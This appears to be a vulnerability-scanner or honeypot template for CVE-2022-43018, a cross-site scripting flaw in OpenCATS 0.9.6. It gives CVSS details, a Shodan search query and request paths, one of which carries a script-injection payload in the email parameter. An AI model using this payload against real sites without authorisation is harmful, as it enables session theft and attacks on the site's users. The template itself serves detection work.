id: CVE-2022-43018
info:
  name: OpenCATS 0.9.6 - Cross-Site Scripting
  author: arafatansari
  description: 'OpenCATS 0.9.6 contains a cross-site scripting vulnerability via the
    email parameter in the Check Email function. An attacker can inject arbitrary
    script in the browser of an unsuspecting user in the context of the affected site.
    This can allow the attacker to steal cookie-based authentication credentials and
    launch other attacks.

    '
  severity: medium
  remediation: 'Upgrade to a patched version of OpenCATS or apply the necessary security
    patches provided by the vendor.

    '
  reference:
  - https://github.com/hansmach1ne/opencats_zero-days/blob/main/XSS_in_checkEmail.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43018
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-43018
    cwe-id: CWE-79
    epss-score: 0.00099
    epss-percentile: 0.40565
    cpe: cpe:2.3:a:opencats:opencats:0.9.6:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: opencats
    product: opencats
    shodan-query: title:"OpenCATS"
  tags: cve,cve2022,xss,opencats,authenticated
traps:
- request:
    method: POST
    path: /index.php?m=login&a=attemptLogin
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'username={{username}}&password={{password}}

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: </script><script>alert(document.domain)</script>:0
- request:
    method: GET
    path: /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script>
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
